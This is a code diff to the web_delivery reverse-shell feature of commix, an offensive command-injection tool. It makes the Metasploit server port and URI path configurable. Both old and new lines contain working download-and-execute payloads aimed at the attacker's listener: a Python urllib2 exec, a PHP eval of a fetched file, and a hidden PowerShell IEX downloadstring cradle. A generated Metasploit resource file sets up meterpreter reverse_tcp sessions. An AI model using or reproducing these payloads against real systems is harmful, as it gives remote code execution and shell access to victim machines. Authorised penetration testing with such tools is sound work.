@@ -432,7 +432,6 @@ commix(""" + Style.BRIGHT + Fore.RED + """web_delivery""" + Style.RESET_ALL + ""
           continue
           
         output = "web_delivery.rc"
-        target = str(int(web_delivery)-1)
         if web_delivery == '1':
           payload = "python/meterpreter/reverse_tcp"
         elif web_delivery == '2':
@@ -442,14 +441,15 @@ commix(""" + Style.BRIGHT + Fore.RED + """web_delivery""" + Style.RESET_ALL + ""
 
         with open(output, 'w+') as filewrite:
           filewrite.write("use exploit/multi/script/web_delivery\n"
-                          "set target " + target + "\n"
+                          "set target " + web_delivery + "\n"
                           "set payload " + payload + "\n"
-                          "set lhost "+ str(settings.LHOST) + "\n"
-                          "set uripath / \n"
+                          "set lhost " + str(settings.LHOST) + "\n"
+                          "set srvport " + str(settings.SRVPORT) + "\n"
+                          "set uripath " + settings.URIPATH + "\n"
                           "exploit\n\n")
 
         if web_delivery == '1':
-          data = "import urllib2; r=urllib2.urlopen('http://" + str(settings.LHOST) + ":8080/'); exec(r.read());"
+          data = "import urllib2; r=urllib2.urlopen('http://" + str(settings.LHOST) + ":" + str(settings.SRVPORT) + settings.URIPATH + "'); exec(r.read());"
           data = base64.b64encode(data)
           if settings.TARGET_OS == "win" and not settings.USER_DEFINED_PYTHON_DIR: 
             set_python_working_dir()
@@ -462,9 +462,9 @@ commix(""" + Style.BRIGHT + Fore.RED + """web_delivery""" + Style.RESET_ALL + ""
         elif web_delivery == '2':
           if settings.TARGET_OS == "win" and not settings.USER_DEFINED_PHP_DIR:
             set_php_working_dir()
-            other_shell = settings.WIN_PHP_DIR + " -d allow_url_fopen=true -r eval(file_get_contents('http://" + str(settings.LHOST) + ":8080/'));"
+            other_shell = settings.WIN_PHP_DIR + " -d allow_url_fopen=true -r eval(file_get_contents('http://" + str(settings.LHOST) + ":" + str(settings.SRVPORT) + settings.URIPATH + "'));"
           else:
-            other_shell = "php -d allow_url_fopen=true -r \"eval(file_get_contents('http://" + str(settings.LHOST) + ":8080/'));\""
+            other_shell = "php -d allow_url_fopen=true -r \"eval(file_get_contents('http://" + str(settings.LHOST) + ":" + str(settings.SRVPORT) + settings.URIPATH + "'));\""
           msf_launch_msg(output)
           break
 
@@ -473,7 +473,7 @@ commix(""" + Style.BRIGHT + Fore.RED + """web_delivery""" + Style.RESET_ALL + ""
             windows_only_attack_vector()
             continue
           else:
-            other_shell = "powershell -nop -w hidden -c $x=new-object net.webclient;$x.proxy=[Net.WebRequest]::GetSystemWebProxy(); $x.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials; IEX $x.downloadstring('http://" + str(settings.LHOST) + ":8080/');"
+            other_shell = "powershell -nop -w hidden -c $x=new-object net.webclient;$x.proxy=[Net.WebRequest]::GetSystemWebProxy(); $x.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials; IEX $x.downloadstring('http://" + str(settings.LHOST) + ":" + str(settings.SRVPORT) + settings.URIPATH + "');"
             msf_launch_msg(output)
             break
       break
